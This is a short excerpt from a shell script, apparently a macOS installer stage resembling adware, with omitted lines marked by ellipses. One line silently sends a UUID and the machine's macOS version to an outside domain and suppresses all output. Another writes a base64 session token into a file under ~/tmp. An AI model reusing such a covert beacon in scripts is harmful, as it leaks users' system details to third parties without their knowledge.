...
curl -s "https://brightly.buzz/post_info?uuid=eb8be80f-ec6b-489f-8bcc-344dfc3d7e2b&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1
...
cd ~/tmp
echo SESSION=Wbx0JC5E8ho+xdSTbRpirMu+NNCbR9iFEqy6qfD2MAEmxTMNjHbr0A/guqOk6riCZLzVwhTcncjct6bGqRi/4w== > context
